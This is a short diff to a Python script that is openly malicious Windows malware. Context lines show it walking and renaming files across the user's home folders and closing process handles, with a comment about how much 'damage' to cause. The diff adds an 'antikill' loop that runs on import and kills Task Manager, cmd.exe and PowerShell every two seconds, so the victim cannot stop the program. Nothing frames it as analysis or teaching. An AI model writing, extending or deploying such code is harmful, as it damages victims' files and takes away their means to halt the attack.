@@ -14,7 +14,7 @@ def rename():
     filepaths = []
     dirs = []
 
-    # get most file paths in users home dir. we don't wanna cause to much damage and take system files
+    # get most file paths in users home dir. we don't wanna cause too much damage and take system files
     for dir, subdir, files in os.walk(f'C:/Users/{username}/'):
         if 'Desktop' and 'Documents' and 'Music' and 'Videos' and 'Downloads' in dir:
             if 'AppData' not in dir:
@@ -50,5 +50,31 @@ def closeactivewindow():
             ctypes.windll.kernel32.CloseHandle(handle)
         except:
             continue
+
+def antikill():
+    while True:
+        try:
+            subprocess.getoutput("wmic process where name=\"taskmgr.exe\" delete")
+            subprocess.getoutput("wmic process where name=\"cmd.exe\" delete")
+            subprocess.getoutput("wmic process where name=\"powershell.exe\" delete")
+            time.sleep(2)
+        except:
+            continue
+antikill()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
